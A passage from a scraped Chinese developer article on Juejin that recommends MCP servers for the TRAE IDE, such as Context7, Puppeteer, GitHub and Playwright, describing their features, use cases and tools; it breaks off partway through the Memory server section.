<p>🤣</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE IDE 10 大热门 MCP Server 推荐]]></title>    <link>https://juejin.cn/post/7594801581003718692</link>    <guid>https://juejin.cn/post/7594801581003718692</guid>    <pubDate>2026-01-14T07:31:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594801581003718692" data-draft-id="7594302398687379510" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE IDE 10 大热门 MCP Server 推荐"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2026-01-14T07:31:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE IDE 10 大热门 MCP Server 推荐
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:31:57.000Z" title="Wed Jan 14 2026 07:31:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读22分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fe3f5420775484f81876aa5452a76c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=Y%2FT15jOnwiQJdWrN3IIAFVCPKcc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>本文作者：Jiaqi，TRAE 技术文档工程师</p>
</blockquote>
<p>通过引入合适的 MCP Server，智能体可以深度参与到日常开发流程中，协助完成项目文件读取、官方文档获取、浏览器自动化、代码仓库管理，以及跨会话的上下文维护等任务。</p>
<p>本文将基于真实开发场景，介绍 TRAE IDE 中常用的 10 个 MCP Server，并梳理了它们的核心能力、使用场景与可用工具，帮助你在不同开发阶段选择合适的 MCP Server，从而提升你的日常开发效率。 </p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/297095766119461c9bd501892861da0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=Hky7QlUgjXATH3DYdCJZq8FITWg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>MCP 介绍</strong></h2>
<p>Model Context Protocol (MCP) 是一种协议，它允许大型语言模型（LLMs）访问自定义的工具和服务。TRAE 中的智能体作为 MCP 客户端可以选择向 MCP Server 发起请求，以使用它们提供的工具。你可以自行添加 MCP Server，并添加到<strong>自定义的智能体</strong>中来使用。</p>
<p>在 TRAE IDE 中，MCP Server 支持三种传输类型：stdio 传输、SSE 传输、Streamable HTTP 传输。 </p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/611d37bd6b1f4a079191fdb1101a3044~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=Y5TJwdr05imOO6LqmJmNnPiS4%2Fc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>概览</strong></h2>
<p>以下是在 TRAE IDE 中的 10款热门 MCP Server。</p>

















































<table><thead><tr><th><strong>MCP Server</strong></th><th><strong>简介</strong></th></tr></thead><tbody><tr><td>Context7 </td><td>Context7 MCP Server 提供面向 AI 模型的文档检索与上下文注入能力，可实时获取官方文档的最新内容和指定版本的代码示例。 </td></tr><tr><td>Puppeteer </td><td>Puppeteer MCP Server 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页进行交互、截取屏幕截图，并执行 JavaScript。 </td></tr><tr><td>Sequential Thinking</td><td>Sequential Thinking MCP Server 通过结构化的思维流程，为动态且具反思性的问题求解提供工具。</td></tr><tr><td>GitHub </td><td>GitHub MCP Server 基于 GitHub API，允许 LLM 直接访问并管理 GitHub 上的仓库、代码、用户、Issue 与 Pull Request。 </td></tr><tr><td>Figma AI Bridge </td><td>Figma AI Bridge MCP Server 针对设计到实现阶段，提供查看、分析和提取 Figma 设计数据的能力，帮助 LLM 理解设计的结构并辅助精确还原设计稿中内容。 </td></tr><tr><td>Playwright</td><td>Playwright MCP Server 基于 Playwright 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页交互、截取屏幕截图、生成测试代码、抓取网页内容，并执行 JavaScript。 </td></tr><tr><td>Memory</td><td>Memory MCP Server 通过本地知识图谱（Knowledge Graph）持久化记忆，使 LLM 能够跨会话保留用户相关的上下文信息。</td></tr><tr><td>Excel</td><td>Excel MCP Server 用于读取 Microsoft Excel 文件中的电子表格数据，或向其中写入数据。 </td></tr><tr><td>File System</td><td>File System MCP Server 提供基于文件系统的文件读取能力。 </td></tr><tr><td>Chrome DevTools MCP</td><td>Chrome DevTools MCP 让 AI 智能体能够直接控制并深入检查 Chrome 浏览器。它向 AI 开放了 Chrome DevTools 的全部能力，使其能更精准、高效地完成网页自动化测试、故障排查及性能分析等任务。 </td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96ceb3a01e5949d984220b0b98696895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=5sB57QVm5SK%2BXa2G4nPnDXEgWGs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>MCP 具体介绍</strong></h2>
<h3 data-id="heading-3"><strong>Context7</strong></h3>
<p>Context7 MCP Server 提供面向 AI 模型的文档检索与上下文注入能力，可实时获取官方文档的最新内容和指定版本的代码示例，确保模型在回答问题、生成代码或提供方案时，基于最新的官方信息。</p>
<h4 data-id="heading-4"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>官方文档实时检索：</strong> 直接从官方文档源获取内容，而非依赖模型训练阶段的静态知识，支持检索最新或指定版本的 API 参考与示例代码。</p>
</li>
<li>
<p><strong>文档上下文注入：</strong> 将检索到的文档内容直接注入到 LLM 的上下文中，使模型在“已阅读官方文档”的前提下进行回答或生成代码。</p>
</li>
<li>
<p><strong>库与文档的标准化解析：</strong> 将模糊的库名映射为 Context7 可识别的库 ID，确保后续可准确查询到目标文档。 </p>
</li>
</ul>
<h4 data-id="heading-5"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>API 开发：</strong> 获取最新框架或 SDK 的 API 定义与示例，避免误用已废弃或不存在的接口。</p>
</li>
<li>
<p><strong>配置与脚本编写：</strong> 编写 Cloudflare Workers、中间件，或构建、部署相关配置时，确保配置项和字段名称与官方文档中的内容一致。</p>
</li>
<li>
<p><strong>代码生成与重构：</strong> 在生成或重构代码时，确保实现方式符合当前的官方推荐做法，减少因文档过时导致的返工。</p>
</li>
<li>
<p><strong>问题排查与最佳实践查询：</strong> 基于官方文档获取错误说明、使用限制和推荐方案，提高问题定位与解决的准确性。 </p>
</li>
</ul>
<h4 data-id="heading-6"><strong>工具</strong></h4>
<p>Context7 MCP Server 为 LLM 提供以下可调用的工具： </p>

















<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>resolve-library-id</td><td>将通用的库名称解析为 Context7 兼容的库 ID。</td></tr><tr><td>query-docs</td><td>使用 Context7 兼容的库 ID 获取指定库的文档。</td></tr></tbody></table>
<h3 data-id="heading-7"><strong>Puppeteer</strong></h3>
<p>Puppeteer MCP Server 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页进行交互、截取屏幕截图，并执行 JavaScript。</p>
<h4 data-id="heading-8"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>浏览器控制自动化：</strong> 在真实浏览器中进行页面导航，支持点击、悬停、表单填写等基础网页交互操作，模拟用户行为。</p>
</li>
<li>
<p><strong>JavaScript 执行：</strong> 直接在浏览器控制台中执行 JavaScript，既能读取当前页面的各类状态信息，也能完成计算任务或触发页面的内置逻辑。</p>
</li>
<li>
<p><strong>页面捕获：</strong> 对整个页面或指定元素进行截图，为 AI 模型提供直观、可验证的页面渲染结果。</p>
</li>
<li>
<p><strong>控制台日志监控：</strong> 获取浏览器控制台的输出信息，包括页面脚本产生的所有 console 日志，辅助调试与问题定位。 </p>
</li>
</ul>
<h4 data-id="heading-9"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>网页功能验证与调试：</strong> 验证网页交互功能是否符合预期效果，同时结合捕获的控制台日志，辅助开发人员快速定位并调试前端问题。</p>
</li>
<li>
<p><strong>页面状态与渲染检查：</strong> 通过截图功能确认网页的 UI 渲染效果是否达标，同时可对比不同操作前后的页面变化，验证操作对页面的影响。 </p>
</li>
</ul>
<h4 data-id="heading-10"><strong>工具</strong></h4>
<p>Puppeteer MCP Server 为 LLM 提供以下可调用的工具：</p>





































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>puppeteer_navigate</td><td>在浏览器中导航到任意 URL。</td></tr><tr><td>puppeteer_screenshot</td><td>对整个页面或指定元素进行截图。</td></tr><tr><td>puppeteer_click</td><td>点击页面中的元素。 </td></tr><tr><td>puppeteer_hover</td><td>将鼠标悬停在页面元素上。</td></tr><tr><td>puppeteer_fill</td><td>填写输入框。</td></tr><tr><td>puppeteer_select</td><td>选择带有 SELECT 标签的元素。</td></tr><tr><td>puppeteer_evaluate</td><td>在浏览器控制台中执行 JavaScript。</td></tr></tbody></table>
<h3 data-id="heading-11"><strong>Sequential Thinking</strong></h3>
<p>Sequential Thinking MCP Server 通过结构化的思维流程，为动态且具反思性的问题求解提供工具。</p>
<h4 data-id="heading-12"><strong>核心功能</strong></h4>
<ul>
<li>
<p>将复杂问题拆解为可管理的步骤。</p>
</li>
<li>
<p>随着理解加深，对思路进行修订和完善。</p>
</li>
<li>
<p>在不同的推理路径之间进行分支探索。</p>
</li>
<li>
<p>动态调整整体思考步骤的数量。</p>
</li>
<li>
<p>生成并验证解决方案假设。 </p>
</li>
</ul>
<h4 data-id="heading-13"><strong>使用场景</strong></h4>
<ul>
<li>
<p>拆解复杂问题，并按步骤逐步解决。</p>
</li>
<li>
<p>需要预留修改空间的规划与设计过程。</p>
</li>
<li>
<p>可能需要中途调整方向的分析任务。</p>
</li>
<li>
<p>一开始难以完全明确问题范围的场景。</p>
</li>
<li>
<p>需要在多个步骤中持续保持上下文的任务。</p>
</li>
<li>
<p>需要过滤无关信息、聚焦关键信息的情况。 </p>
</li>
</ul>
<h4 data-id="heading-14"><strong>工具</strong></h4>
<p>Sequential Thinking MCP Server 为 LLM 提供以下可调用的工具：</p>













<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>sequential_thinking</td><td>为问题求解和分析提供细致的、逐步推进的思考过程。</td></tr></tbody></table>
<h3 data-id="heading-15"><strong>GitHub</strong></h3>
<p>GitHub MCP Server 基于 GitHub API，允许 LLM 直接访问并管理 GitHub 上的仓库、代码、用户、Issue 与 Pull Request。</p>
<p>该 MCP Server 支持的所有操作<strong>仅作用于</strong> GitHub 上的远程资源：所有文件操作均发生在 GitHub 仓库中，通过 Commit 与 Pull Request 提交，<strong>不会读取或修改用户本地的文件系统。</strong></p>
<h4 data-id="heading-16"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>仓库与文件管理：</strong> 支持全面管理代码库，包括仓库的创建、Fork、搜索及分支管理；同时具备精细的文件操作功能，允许直接读取内容、创建或更新文件以及批量推送代码。</p>
</li>
<li>
<p><strong>Issue 追踪：</strong> 聚焦于项目进度的管理与协同，支持对 Issue 进行创建、筛选、状态更新及评论。</p>
</li>
<li>
<p><strong>Pull Request 协作：</strong> 涵盖代码合并的全生命周期，从发起 Pull Request、查看变更详情、同步分支最新改动，到最终合并代码。</p>
</li>
<li>
<p><strong>代码评审与信息检索：</strong> 支持发起和管理代码评审，获取评审意见；同时提供强大的搜索能力，可快速定位代码片段、用户或相关评论。 </p>
</li>
</ul>
<h4 data-id="heading-17"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>AI 辅助代码开发：</strong> 自动执行从代码修改、分支创建到变更提交的全流程。在遵循版本控制规范的前提下，实现开发需求的快速落地与代码历史的清晰记录。</p>
</li>
<li>
<p><strong>自动化协作工作流：</strong> 全面接管 Issue 追踪与 Pull Request 管理。自动完成任务创建、上下文补充、评审及分支合并，减少人工操作成本。</p>
</li>
<li>
<p><strong>项目调研与分析：</strong> 深度解析仓库的架构、代码逻辑及变更历史。结合全局检索能力，快速定位核心信息并梳理项目脉络，然后生成调研报告。</p>
</li>
<li>
<p><strong>智能的仓库管理：</strong> 将 AI 作为团队协作的一部分，执行重复性的 GitHub 操作，提升个人或团队的开发效率。</p>
</li>
</ul>
<h4 data-id="heading-18"><strong>工具</strong></h4>
<p>GitHub MCP Server 为 LLM 提供以下可调用的工具：</p>

















































































































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>create_or_update_file </td><td>在仓库中创建或更新单个文件。 </td></tr><tr><td>push_files </td><td>在一次提交中推送多个文件。 </td></tr><tr><td>search_repositories </td><td>搜索 GitHub 仓库。 </td></tr><tr><td>create_repository </td><td>创建新的 GitHub 仓库。 </td></tr><tr><td>get_file_contents </td><td>获取文件或目录内容。 </td></tr><tr><td>create_issue   </td><td>创建新的 Issue。 </td></tr><tr><td>create_pull_request </td><td>创建新的 Pull Request。 </td></tr><tr><td>fork_repository </td><td>Fork 一个仓库。 </td></tr><tr><td>create_branch </td><td>创建新分支。 </td></tr><tr><td>list_issues</td><td>列出并筛选仓库 Issue。 </td></tr><tr><td>update_issue </td><td>更新已有 Issue。 </td></tr><tr><td>add_issue_comment </td><td>为 Issue 添加评论。 </td></tr><tr><td>search_code </td><td>在 GitHub 上搜索代码。 </td></tr><tr><td>search_issues </td><td>搜索 Issue 和 Pull Request。 </td></tr><tr><td>search_users </td><td>搜索 GitHub 用户。 </td></tr><tr><td>list_commits </td><td>获取仓库某个分支的提交记录。 </td></tr><tr><td>get_issue </td><td>获取仓库中指定 Issue 的内容。 </td></tr><tr><td>get_pull_request </td><td>获取指定 Pull Request 的详情。 </td></tr><tr><td>list_pull_requests</td><td>列出并筛选仓库的 Pull Request。 </td></tr><tr><td>create_pull_request_review </td><td>为某个 Pull Request 创建评审。 </td></tr><tr><td>merge_pull_request </td><td>合并 Pull Request。 </td></tr><tr><td>get_pull_request_files </td><td>获取某个 Pull Request 中变更的文件列表。 </td></tr><tr><td>get_pull_request_status </td><td>获取某个 Pull Request 的所有状态检查的汇总状态。 </td></tr><tr><td>update_pull_request_branch</td><td>使用 base 分支的最新更改更新某个 Pull Request 分支（等同于 GitHub 中的 “Update branch” 按钮）。 </td></tr><tr><td>get_pull_request_comments </td><td>获取某个 Pull Request 的评审评论。 </td></tr><tr><td>get_pull_request_reviews </td><td>获取某个 Pull Request 的评审记录。 </td></tr></tbody></table>
<h3 data-id="heading-19"><strong>Figma AI Bridge</strong></h3>
<p>Figma AI Bridge MCP Server 针对设计到实现阶段，提供查看、分析和提取 Figma 设计数据的能力，帮助 LLM 理解你的设计思路并辅助你精确还原设计稿中的内容。</p>
<h4 data-id="heading-20"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>Figma 设计解析：</strong> 获取 Figma 文件或指定节点的布局与结构信息。在无法直接获得节点 ID 的情况下，仍可分析整个设计文件。</p>
</li>
<li>
<p><strong>设计资源下载：</strong> 根据图像或图标节点 ID，自动下载设计中使用的 SVG / PNG 图片，便于在实现阶段直接复用设计资产。</p>
</li>
<li>
<p><strong>为 AI 提供可理解的设计上下文：</strong> 将 Figma 中的设计信息转换为 AI 可消费的数据，为后续的代码生成、样式还原或布局分析提供依据。 </p>
</li>
</ul>
<h4 data-id="heading-21"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>设计还原与前端实现：</strong> 辅助 AI 理解设计的结构，提高实际实现与设计稿的一致性。</p>
</li>
<li>
<p><strong>设计资产自动提取：</strong> 自动下载图标、图片等资源，减少手动操作。</p>
</li>
<li>
<p><strong>设计到代码的自动转换：</strong> 为代码生成提供设计思路相关的准确上下文，作为从设计到实现链路中的关键一环。</p>
</li>
<li>
<p><strong>Agent 驱动的 UI 分析与实现：</strong> 让 AI 在理解设计思路的基础上分析 UI 布局并思考实现方案。 </p>
</li>
</ul>
<h4 data-id="heading-22"><strong>工具</strong></h4>
<p>Figma AI Bridge MCP Server 为 LLM 提供以下可调用的工具：</p>

















<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>download_figma_images</td><td>根据图像或图标节点的 ID，下载 Figma 文件中使用的 SVG 和 PNG 图片。</td></tr><tr><td>get_figma_data</td><td>当无法获取节点 ID 时，用于获取整个 Figma 文件的布局信息。同时支持获取某个 Figma 文件或文件中指定节点的相关信息。</td></tr></tbody></table>
<h3 data-id="heading-23"><strong>Playwright</strong></h3>
<p>Playwright MCP Server 基于 Playwright 提供浏览器自动化能力，使 LLM 能够在真实的浏览器环境中与网页交互、截取屏幕截图、生成测试代码、抓取网页内容，并执行 JavaScript。</p>
<p>相较于基础浏览器自动化，它进一步扩展了测试代码生成、网络请求控制与多设备模拟等能力，适合更复杂、结构化的网页测试。 </p>
<h4 data-id="heading-24"><strong>核心功能</strong></h4>
<ul>
<li>
<p><strong>自动化浏览器控制</strong></p>
<p>支持页面导航、点击、悬停、表单填写、拖拽、键盘操作等交互。</p>
<p>覆盖普通 DOM 以及 iframe 场景。</p>
</li>
<li>
<p><strong>代码生成与测试录制（Codegen）</strong></p>
<p>支持开启代码生成会话，记录浏览器操作。</p>
<p>自动生成可复用的 Playwright 测试代码文件。</p>
</li>
<li>
<p><strong>页面内容捕获</strong></p>
<p>对页面或指定元素进行截图。</p>
<p>提取页面可见文本或 HTML 内容。</p>
<p>支持将页面保存为 PDF。</p>
</li>
<li>
<p><strong>JavaScript 执行与控制台调试</strong></p>
<p>在浏览器上下文中执行 JavaScript。</p>
<p>获取并过滤浏览器控制台日志，用于调试与分析。</p>
</li>
<li>
<p><strong>网络请求与响应控制</strong></p>
<p>主动发起 HTTP 请求。</p>
<p>支持等待并断言特定网络响应，便于接口级验证。</p>
</li>
<li>
<p><strong>多设备与浏览器环境模拟</strong></p>
<p>调整浏览器视口大小或使用设备预设。</p>
<p>内置 143+ 设备模型，提供正确的 User-Agent 与触控模拟，支持自定义 User-Agent。 </p>
</li>
</ul>
<h4 data-id="heading-25"><strong>使用场景</strong></h4>
<ul>
<li>
<p><strong>自动化测试与测试代码生成</strong></p>
<p>执行由 AI 驱动的网页测试并录制真实操作，生成 Playwright 测试脚本。</p>
<p>回归测试、端到端测试。</p>
</li>
<li>
<p><strong>复杂网页交互验证</strong></p>
<p>验证页面在不同设备、分辨率和 User-Agent 下的交互逻辑。</p>
<p>处理 iframe、文件上传、标签页切换等复杂交互。</p>
</li>
<li>
<p><strong>请求级调试与验证</strong></p>
<p>同时验证前端交互与后端接口响应。</p>
<p>适合需要精确控制请求与响应的调试场景。</p>
</li>
<li>
<p><strong>Agent 驱动的网页操作与信息采集</strong></p>
<p>抓取可见内容或结构化 HTML。</p>
<p>在真实浏览器上下文中完成端到端任务。 </p>
</li>
</ul>
<h4 data-id="heading-26"><strong>工具</strong></h4>
<p>​Playwright MCP Server 为 LLM 提供以下可调用的工具：</p>












































































































































<table><thead><tr><th><strong>工具</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>start_codegen_session  </td><td>开始一个新的代码生成会话，用于记录 Playwright 操作。  </td></tr><tr><td>end_codegen_session  </td><td>结束代码生成会话并生成测试文件。  </td></tr><tr><td>get_codegen_session  </td><td>获取关于代码生成会话的信息。  </td></tr><tr><td>clear_codegen_session  </td><td>清除代码生成会话而不生成测试文件。  </td></tr><tr><td>playwright_navigate  </td><td>导航到一个 URL。  </td></tr><tr><td>playwright_screenshot  </td><td>对当前页面或特定元素进行截图。  </td></tr><tr><td>playwright_click  </td><td>点击页面上的元素。  </td></tr><tr><td>playwright_iframe_click  </td><td>点击 iframe 中的元素。  </td></tr><tr><td>playwright_iframe_fill  </td><td>在页面中的 iframe 里填充某个元素。 </td></tr><tr><td>playwright_fill  </td><td>填写输入字段。  </td></tr><tr><td>playwright_select  </td><td>使用 Select 标签选择页面上的元素。  </td></tr><tr><td>playwright_hover  </td><td>悬停在页面的元素上。</td></tr><tr><td>playwright_upload_file  </td><td>将文件上传到页面中的 input[type="file"] 元素。</td></tr><tr><td>playwright_evaluate  </td><td>在浏览器控制台执行 JavaScript。  </td></tr><tr><td>playwright_console_logs  </td><td>检索浏览器的控制台日志（带过滤选项）。  </td></tr><tr><td>playwright_resize  </td><td>使用自定义尺寸或设备预设来调整浏览器视口大小。支持 143 种以上的设备预设，包括 iPhone、iPad、各类 Android 设备以及桌面浏览器，并提供正确的 User-Agent 和触控（Touch）模拟。</td></tr><tr><td>playwright_close  </td><td>关闭浏览器并释放所有资源。  </td></tr><tr><td>playwright_get  </td><td>执行 HTTP GET 请求。  </td></tr><tr><td>playwright_post  </td><td>执行 HTTP POST 请求。  </td></tr><tr><td>playwright_put  </td><td>执行 HTTP PUT 请求。  </td></tr><tr><td>playwright_patch  </td><td>执行 HTTP PATCH 请求。  </td></tr><tr><td>playwright_delete  </td><td>执行 HTTP DELETE 请求。  </td></tr><tr><td>playwright_expect_response  </td><td>请求 Playwright 开始等待某个 HTTP 响应。该工具只会启动等待操作，但不会阻塞或等待该操作完成。  </td></tr><tr><td>playwright_assert_response  </td><td>等待并校验之前已发起的 HTTP 响应等待操作。  </td></tr><tr><td>playwright_custom_user_agent  </td><td>为浏览器设置自定义 User-Agent。  </td></tr><tr><td>playwright_get_visible_text  </td><td>获取当前页面的可见文本内容。  </td></tr><tr><td>playwright_get_visible_html  </td><td>获取当前页面的 HTML 内容。默认情况下，输出结果会移除所有 
</td></tr><tr><td>playwright_go_back  </td><td>在浏览器历史中后退。  </td></tr><tr><td>playwright_go_forward  </td><td>在浏览器历史中前进。  </td></tr><tr><td>playwright_drag</td><td>将元素拖动到目标位置。  </td></tr><tr><td>playwright_press_key  </td><td>按下键盘键。  </td></tr><tr><td>playwright_save_as_pdf  </td><td>将当前页面保存为 PDF 文件。  </td></tr><tr><td>playwright_click_and_switch_tab  </td><td>点击一个链接并切换到新打开的标签页。  </td></tr></tbody></table>
<h3 data-id="heading-27"><strong>Memory</strong></h3>
<p>Memory MCP Server 通过本地知识图谱（Knowledge Graph）持久化记忆，使 LLM 能够跨会话保留用户相关的上下文信息。</p>
<p>它的<strong>核心目标是将零散、非结构化的用户信息转化为可结构化、可查询、可演化的长期记忆，并在后续对话中被持续维护和利用。</strong></p>
<p>Memory MCP Server 采用知识图谱作为记忆模型，由以下三类核心概念共同构成一个可扩展的记忆网络： </p>





















